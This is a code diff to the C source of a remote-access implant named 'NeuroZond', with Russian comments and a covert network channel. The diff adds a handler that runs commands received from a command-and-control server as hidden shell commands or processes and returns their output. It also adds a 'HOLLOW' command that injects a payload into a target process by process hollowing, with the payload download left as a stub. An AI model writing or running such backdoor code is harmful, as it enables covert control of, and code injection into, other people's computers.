@@ -24,6 +24,9 @@
 #endif
 
 #include "network/covert_channel.h"
+#include "../include/crypto_utils.h" // Предполагаем, что он есть для шифрования
+#include "../include/command_executor.h" // Добавляем исполнитель команд
+#include "../include/injection.h" // Добавляем модуль инъекций
 
 #define VERSION "1.0.0"
 #define DEFAULT_CHANNEL_TYPE CHANNEL_TYPE_HTTPS
@@ -196,9 +199,17 @@ CovertChannelHandle create_channel(const ZondParams *params) {
 }
 
 /**
- * @brief Обработка полученной команды
+ * @brief Обработка полученной команды с использованием command_executor
  * 
- * @param command строка с командой
+ * Формат команды от C2 (пример):
+ *   "SHELL:ls -la /tmp"
+ *   "PROCESS:/usr/bin/whoami"
+ *   "HOLLOW:<target_path> <payload_url>"
+ * 
+ * Формат ответа:
+ *   "EXIT_CODE: <код>\nOUTPUT:\n<вывод команды>"
+ * 
+ * @param command строка с командой от C2
  * @param response буфер для ответа
  * @param max_response_size максимальный размер буфера ответа
  * @return int размер ответа или -1 при ошибке
@@ -207,39 +218,98 @@ int process_command(const char *command, char *response, size_t max_response_siz
     if (command == NULL || response == NULL || max_response_size == 0) {
         return -1;
     }
+    
+    CommandType cmd_type = COMMAND_TYPE_SHELL; // По умолчанию SHELL
+    const char* cmd_line = command;
+    int response_len = 0;
 
-    // Простой обработчик команд для демонстрации
-    if (strncmp(command, "ping", 4) == 0) {
+    // Парсинг префикса команды
+    if (strncmp(command, "SHELL:", 6) == 0) {
+        cmd_type = COMMAND_TYPE_SHELL;
+        cmd_line = command + 6;
+    } else if (strncmp(command, "PROCESS:", 8) == 0) {
+        cmd_type = COMMAND_TYPE_PROCESS;
+        cmd_line = command + 8;
+    } else if (strncmp(command, "HOLLOW:", 7) == 0) {
+        char target_path[MAX_PATH] = {0};
+        char payload_url[1024] = {0};
+        // Простой парсинг: HOLLOW:<target> <url>
+        if (sscanf(command + 7, "%259s %1023s", target_path, payload_url) == 2) {
+            printf("[Main] Debug: Parsed HOLLOW command: target='%s', url='%s'\n", target_path, payload_url);
+
+            // TODO: Скачать payload по payload_url
+            unsigned char* payload_data = (unsigned char*)"PAYLOAD_PLACEHOLDER"; // ЗАГЛУШКА
+            size_t payload_size = strlen((char*)payload_data);
+            printf("[Main] Warning: Payload download is a STUB! Using placeholder.\n");
+
+            int inject_result = inject_hollow_process(target_path, payload_data, payload_size);
+            snprintf(response, max_response_size, "HOLLOW_RESULT:%d", inject_result);
+            // TODO: Освободить payload_data, если он был скачан
+
+        } else {
+            snprintf(response, max_response_size, "ERROR: Invalid HOLLOW command format.");
+        }
+        return strlen(response);
+    } else if (strcmp(command, "ping") == 0) {
         snprintf(response, max_response_size, "pong");
-        return 4;
-    } else if (strncmp(command, "version", 7) == 0) {
-        snprintf(response, max_response_size, "NeuroZond v%s", VERSION);
         return strlen(response);
-    } else if (strncmp(command, "sysinfo", 7) == 0) {
-        char hostname[256] = {0};
-#ifdef _WIN32
-        DWORD size = sizeof(hostname);
-        GetComputerNameA(hostname, &size);
-#else
-        gethostname(hostname, sizeof(hostname));
-#endif
-        snprintf(response, max_response_size, "Host: %s, OS: %s", 
-                hostname, 
-#ifdef _WIN32
-                "Windows"
-#else
-                "Unix/Linux"
-#endif
-        );
+    } else if (strcmp(command, "version") == 0) {
+        snprintf(response, max_response_size, "NeuroZond v%s (Executor Active)", VERSION);
         return strlen(response);
-    } else if (strncmp(command, "exit", 4) == 0) {
+    } else if (strcmp(command, "exit") == 0) {
         running = 0;
         snprintf(response, max_response_size, "Завершение работы");
         return strlen(response);
     } else {
-        snprintf(response, max_response_size, "Неизвестная команда: %s", command);
+        // Если префикс не найден, считаем всю строку командой SHELL
+        cmd_type = COMMAND_TYPE_SHELL;
+        cmd_line = command;
+        // Можно вернуть ошибку, если нужен строгий формат:
+        // snprintf(response, max_response_size, "ERROR: Unknown command format.");
+        // return strlen(response);
+    }
+
+    // Создаем и настраиваем команду
+    Command* cmd = command_create(cmd_type);
+    if (!cmd) {
+        snprintf(response, max_response_size, "ERROR: Failed to create command: %s", command_executor_get_error_message());
         return strlen(response);
     }
+    
+    if (!command_set_command_line(cmd, cmd_line)) {
+        snprintf(response, max_response_size, "ERROR: Failed to set command line: %s", command_executor_get_error_message());
+        command_free(cmd);
+        return strlen(response);
+    }
+    
+    // Устанавливаем флаг скрытого выполнения (можно сделать опциональным)
+    command_set_flags(cmd, COMMAND_FLAG_HIDDEN);
+
+    // Выполняем команду
+    CommandResult* result = execute_command(cmd);
+    
+    // Формируем ответ
+    if (result != NULL) {
+        int output_len = result->output_length < (max_response_size - 64) ? result->output_length : (max_response_size - 64); // Оставляем место для заголовка
+        response_len = snprintf(response, max_response_size, "EXIT_CODE:%d\nOUTPUT:\n%.*s", 
+                                result->exit_code, 
+                                output_len,
+                                result->output ? result->output : "");
+        if (result->output_length > output_len) {
+             // Добавляем индикатор, что вывод был обрезан
+             if (max_response_size > response_len + 20) { // Проверяем, есть ли место
+                strcat(response, "\n...[TRUNCATED]...");
+                response_len += strlen("\n...[TRUNCATED]...");
+             }
+        }
+        command_result_free(result);
+    } else {
+        snprintf(response, max_response_size, "ERROR: Failed to execute command: %s", command_executor_get_error_message());
+        response_len = strlen(response);
+    }
+    
+    command_free(cmd);
+    return response_len;
 }
 
 /**
@@ -349,6 +419,11 @@ int main(int argc, char *argv[]) {
     }
 #endif
     
+    // Инициализация исполнителя команд
+    if (!command_executor_init()) {
+        fprintf(stderr, "Ошибка инициализации command executor\n");
+    }
+    
     // Парсинг аргументов командной строки
     ZondParams params;
     if (parse_arguments(argc, argv, &params) != 0) {
@@ -379,6 +454,9 @@ int main(int argc, char *argv[]) {
         covert_channel_cleanup(channel);
         channel = NULL;
     }
+    
+    // Очистка command executor
+    command_executor_cleanup();
     
 #ifdef _WIN32
     WSACleanup();
